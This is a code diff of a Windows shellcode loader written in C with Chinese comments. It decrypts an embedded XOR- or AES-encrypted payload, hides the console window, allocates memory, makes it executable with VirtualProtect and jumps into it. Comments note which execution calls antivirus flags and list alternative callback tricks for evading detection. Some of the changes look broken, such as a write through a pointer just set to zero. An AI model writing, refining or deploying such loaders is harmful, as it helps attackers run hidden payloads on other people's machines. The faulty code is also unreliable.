@@ -7,6 +7,9 @@
 #define HIDWORD(x)  (*((DWORD*)&(x)+1))
 
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
+#pragma warning(disable:6011)
+#pragma warning(disable:6387)
+
 
 typedef void(*void_func_ptr)(void);
 
@@ -187,19 +190,22 @@ void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsi
 /*
 * 从加密数据解密shellcode
 * tea加密会报毒，有可能是固定密钥的问题
+* 解密数据存入config->shellcode
 */
 int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
 {
-	//unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	//if (!dwBaseAddr) return -1;
-
 	if (encData[0] == H_ENC_XOR)
 	{
-		int encdatasize = *(unsigned int*)(encData + 1 + 16);
-		for (int i = 0; i < encdatasize; i++)
+		config->shellcodeSize= *(unsigned int*)(encData + 1 + 16);
+		config->shellcode = malloc(config->shellcodeSize);
+		for (int i = 0; i < config->shellcodeSize; i++)
 		{
 			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
 		}
+		if (config->shellcode!=0)
+			memcpy(config->shellcode, encData + 1 + 16 + 4, config->shellcodeSize);
+		else
+			return -1;
 	}
 	else if (encData[0] == H_ENC_AES)
 	{
@@ -263,22 +269,30 @@ int RunSCFromFile(const char *file,struct ConfigurationData* config)
 			encData = 0;
 			if (config->shellcode[0] == P_TYPE_STAGE)
 			{
+				//放到虚拟内存
+				unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				if (dwBaseAddr)
+				{
+					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+					free(config->shellcode);
+					DWORD oldpro = PAGE_READWRITE;
+					if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+						((void(*)())dwBaseAddr)();
+				}
+				
 				//设置跳转代码
 				int amtWritten = (1 + sizeof(DWORD));
 				DWORD jumpOffset = 5;
 				jumpOffset -= amtWritten;
-				{
-					//赋值0xe9
-					//*encData = 0xA1;
-					//*encData ^= 0x48;
-				}
+				//赋值0xe9
+				*encData = 0xA1;
+				*encData ^= 0x48;
+				DWORD* jumpTarget = (DWORD*)(encData + 1);
+				*jumpTarget = jumpOffset;
 
-				//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
-				//*jumpTarget = jumpOffset;
-
-				////执行shellcode代码
-				//void_func_ptr callLoc = (void_func_ptr)(encData);
-				//callLoc();//函数调用报毒
+				//执行shellcode代码
+				void_func_ptr callLoc = (void_func_ptr)(encData);
+				callLoc();//函数调用报毒
 				//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
 				//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
 				//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
